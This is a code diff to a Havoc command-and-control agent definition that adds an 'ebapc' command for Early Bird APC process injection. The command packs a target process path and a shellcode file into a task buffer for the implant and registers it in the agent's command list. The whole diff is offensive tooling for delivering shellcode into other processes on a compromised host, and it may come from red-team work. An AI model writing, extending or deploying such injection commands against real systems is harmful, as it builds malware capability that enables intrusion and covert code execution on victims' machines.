@@ -26,11 +26,45 @@ COMMAND_PWD              = 0x400
 COMMAND_CD               = 0x401
 COMMAND_LS               = 0x402
 
+# Process injection
+
+COMMAND_EBAPC            = 0x600
+
 
 
 # ====================
 # ===== Commands =====
 # ====================
+
+class CommandEbapc( Command ):
+    CommandId   = COMMAND_EBAPC
+    Name        = "ebapc"
+    Description = "Early Bird APC injection"
+    Help        = "Usage: ebapc <process_path> <shellcode_file>"
+    NeedAdmin   = False
+    Mitr        = []
+    Params      = [
+        CommandParam(
+            name="process_name",
+            is_file_path=False,
+            is_optional=False
+        ),
+        CommandParam(
+            name="local_file",
+            is_file_path=True,
+            is_optional=False
+        )
+    ]
+
+    def job_generate( self, arguments: dict ) -> bytes:
+        Task        = Packer()
+        Processname = arguments[ 'process_name' ]
+        local_file    = b64decode( arguments[ 'local_file' ] )
+        Task.add_int( self.CommandId )
+        Task.add_data( Processname )
+        Task.add_data( local_file )
+        return Task.buffer
+
 
 class CommandLs(Command):
     CommandId   = COMMAND_LS
@@ -406,6 +440,7 @@ class Mana(AgentType):
         CommandPwd(),
         CommandCd(),
         CommandLs(),
+        CommandEbapc(),
     ]
 
     # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
